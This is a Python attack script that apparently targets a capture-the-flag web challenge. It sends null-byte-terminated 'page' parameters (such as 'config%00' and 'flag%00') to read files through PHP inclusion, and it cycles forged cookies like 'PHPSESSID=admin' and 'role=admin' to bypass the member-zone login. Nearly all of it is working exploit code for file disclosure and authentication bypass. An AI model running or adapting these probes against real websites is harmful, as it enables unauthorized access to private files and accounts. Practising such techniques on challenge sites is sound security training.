#!/usr/bin/env python3
import requests
import re
from bs4 import BeautifulSoup

s = requests.Session()
base = "https://vip.hax.w3challs.com/"

# Get detailed response for each file with null byte
files_to_check = ["login", "member", "admin", "config", "auth", "secret", "flag"]

print("[*] Extracting actual content from null byte files...")

for file in files_to_check:
    url = f"{base}index.php?page={file}%00"
    r = s.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    
    # Extract the corps div content
    corps = soup.find('div', {'id': 'corps'})
    if corps:
        content = corps.get_text(strip=True)
        forms = corps.find_all('form')
        inputs = corps.find_all('input')
        
        print(f"\n[FILE: {file}]")
        if content:
            print(f"  Content: {content[:200]}")
        if forms:
            for form in forms:
                print(f"  Form action: {form.get('action', 'none')}")
                print(f"  Form method: {form.get('method', 'GET')}")
                for inp in form.find_all('input'):
                    print(f"    Input: name={inp.get('name')}, type={inp.get('type')}")
        
        # Check for hidden content or comments
        if '<!--' in r.text:
            comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
            for comment in comments:
                if comment.strip():
                    print(f"  COMMENT: {comment.strip()[:100]}")
        
        # Check for JavaScript
        scripts = soup.find_all('script')
        for script in scripts:
            if script.string:
                print(f"  SCRIPT: {script.string[:100]}")

# Try member page with different approaches
print("\n[*] Attempting member zone access...")

# Test session manipulation
test_sessions = [
    {'PHPSESSID': 'admin'},
    {'PHPSESSID': '1'},
    {'PHPSESSID': 'member'},
    {'admin': '1'},
    {'member': '1'},
    {'logged_in': '1'},
    {'authenticated': 'true'},
    {'user': 'admin'},
    {'role': 'admin'}
]

for cookies in test_sessions:
    r = s.get(f"{base}index.php?page=member", cookies=cookies)
    if 'welcome' in r.text.lower() or 'flag' in r.text.lower():
        print(f"[!] Interesting response with cookies: {cookies}")

# Check if login has hidden fields or second step
print("\n[*] Analyzing login mechanism...")
r = s.get(f"{base}index.php?page=login")
soup = BeautifulSoup(r.text, 'html.parser')

# Look for all forms and hidden inputs
forms = soup.find_all('form')
for i, form in enumerate(forms):
    print(f"Form {i+1}:")
    for inp in form.find_all('input'):
        print(f"  {inp}")

# Check the "two-step authentication" mentioned
print("\n[*] Testing authentication flow...")

# Step 1: Try basic login
login_data = {'login': 'test', 'pass': 'test'}
r1 = s.post(f"{base}index.php?page=login", data=login_data)

# Check if there's a second step or redirect
if 'step' in r1.text.lower() or 'second' in r1.text.lower() or 'two' in r1.text.lower():
    print("[!] Second step detected in response")
    soup = BeautifulSoup(r1.text, 'html.parser')
    forms = soup.find_all('form')
    for form in forms:
        print(f"  Second form found: {form}")

# Try accessing member with the session after login attempt
r2 = s.get(f"{base}index.php?page=member")
if len(r2.text) > 1000:
    print(f"[*] Member page after login attempt: {len(r2.text)} bytes")
    soup = BeautifulSoup(r2.text, 'html.parser')
    corps = soup.find('div', {'id': 'corps'})
    if corps:
        print(f"  Content: {corps.get_text(strip=True)[:300]}")